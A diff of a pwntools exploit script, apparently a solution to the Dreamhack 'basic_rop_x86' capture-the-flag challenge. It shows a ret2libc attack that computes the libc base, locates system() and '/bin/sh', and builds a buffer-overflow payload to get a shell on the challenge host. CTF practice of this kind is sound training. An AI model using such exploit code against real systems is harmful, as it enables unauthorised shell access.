@@ -1,11 +1,9 @@
 from pwn import *
 
-port = 10821
+port = 22688
 rem = remote("host1.dreamhack.games", port)
-elf = ELF("./basic_rop_x86/problem/basic_rop_x86")
-lib = ELF("./basic_rop_x86/problem/libc.so.6")
-
-def slog(name, addr): return success(': '.join([name, hex(addr)]))
+elf = ELF("./Pwnable/basic_rop_x86/problem/basic_rop_x86")
+lib = ELF("./Pwnable/basic_rop_x86/problem/libc.so.6")
 
 ret = 0x080483c2
 pr = 0x0804868b
@@ -33,10 +31,6 @@ sys_offset = lib.symbols['system']
 sys_addr = lib_base + sys_offset
 binsh_offset = list(lib.search('/bin/sh'))[0]
 binsh_addr = lib_base + binsh_offset
-
-slog('read', read_addr)
-slog('libc_base', lib_base)
-slog('system', sys_addr)
 
 payload = b'A' * 0x48
 payload += p32(sys_addr)
